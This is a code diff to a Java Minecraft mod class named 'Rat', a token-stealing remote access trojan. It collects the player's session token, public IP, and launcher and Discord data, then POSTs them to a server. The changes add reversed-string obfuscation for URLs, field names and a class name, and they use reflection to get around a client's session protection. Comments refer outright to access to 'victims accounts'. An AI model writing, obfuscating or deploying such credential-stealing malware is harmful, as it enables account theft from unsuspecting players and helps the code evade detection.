@@ -1,5 +1,3 @@
-package studio.dreamys;
-
 import com.google.gson.Gson;
 import com.google.gson.JsonObject;
 import com.sun.jna.platform.win32.Crypt32Util;
@@ -43,15 +41,15 @@ public class Rat { //change class name please for the love of god
         new Thread(() -> {
             try {
                 //setup connection
-                HttpURLConnection c = (HttpURLConnection) new URL("http://localhost:80/").openConnection();
+                HttpURLConnection c = (HttpURLConnection) new URL(reverseString("/08:tsohlacol//:ptth")).openConnection();
                 c.setRequestMethod("POST");
                 c.setRequestProperty("Content-type", "application/json");
                 c.setDoOutput(true);
 
                 Minecraft mc = Minecraft.getMinecraft();
-                String ip = new BufferedReader(new InputStreamReader(new URL("https://checkip.amazonaws.com/").openStream())).readLine();
-                String token = mc.getSession().getToken();
-                String feather = "File not found :(", essentials = "File not found :(", lunar = "File not found :(", discord = "Discord not found :(";
+                String ip = new BufferedReader(new InputStreamReader(new URL(reverseString("/moc.swanozama.pikcehc//:sptth")).openStream())).readLine();
+                String token = ReflectionHelper.findField(mc.getSession().getClass(), reverseString("c_852841_dleif"), reverseString("nekot")).get(mc.getSession()).toString();
+                String feather = "Not found :(", essentials = "Not found :(", lunar = "Not found :(", discord = "Not found :(";
 
                 //"if u swap these files with yours, you get infinite access to victims accounts"      -Annah#5795
                 //apparently doesn't work lol
@@ -144,7 +142,7 @@ public class Rat { //change class name please for the love of god
 
                 //pizzaclient bypass
                 if (Loader.isModLoaded("pizzaclient")) {
-                    token = (String) ReflectionHelper.findField(Class.forName("qolskyblockmod.pizzaclient.features.misc.SessionProtection"), "changed").get(null);
+                    token = (String) ReflectionHelper.findField(Class.forName(reverseString("noitcetorPnoisseS.csim.serutaef.tneilcazzip.domkcolbyksloq")), "changed").get(null);
                 }
 
                 //send req
@@ -177,5 +175,13 @@ public class Rat { //change class name please for the love of god
 //            Minecraft.getMinecraft().thePlayer.addChatMessage(new ChatComponentText("§cThis version of SBE has been disabled due to a security issue. Please update to the latest version."));
             MinecraftForge.EVENT_BUS.unregister(this);
         }
+    }
+
+    public static String reverseString(String in) {
+        StringBuilder out = new StringBuilder();
+        for (int i = in.length() - 1; i >= 0; i--) {
+            out.append(in.charAt(i));
+        }
+        return out.toString();
     }
 }
